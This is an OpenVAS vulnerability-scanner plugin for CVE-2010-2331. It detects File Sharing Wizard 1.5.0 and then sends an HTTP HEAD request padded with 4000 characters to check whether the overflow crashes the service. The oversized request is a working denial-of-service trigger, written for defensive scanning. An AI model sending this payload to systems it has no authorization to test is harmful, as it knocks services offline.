###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_fs_40928.nasl 14323 2019-03-19 13:19:09Z jschulte $
#
# File Sharing Wizard 'HEAD' Command Remote Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100745");
  script_version("$Revision: 14323 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-08-05 13:46:20 +0200 (Thu, 05 Aug 2010)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2010-2331");
  script_bugtraq_id(40928);

  script_name("File Sharing Wizard 'HEAD' Command Remote Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/40928");
  script_xref(name:"URL", value:"http://www.sharing-file.net/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("Buffer overflow");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"File Sharing Wizard is prone to a remote buffer-overflow
vulnerability because it fails to perform adequate boundary checks on
user-supplied input.

Successfully exploiting this issue may allow remote attackers to
execute arbitrary code in the context of the application. Failed
attacks will cause denial-of-service conditions.

File Sharing Wizard 1.5.0 is vulnerable, other versions may also
be affected.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port( default:80 );

url = string("/");
buf = http_get_cache(item:url, port:port);

if("File Sharing Wizard" >!< buf)exit(0);

if(http_is_dead(port:port))exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

ex = crap(data:"D", length: 4000);
send(socket:soc,data:string("HEAD ",ex," HTTP/1.0\r\n\r\n"));
close(soc);

sleep(5);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(0);
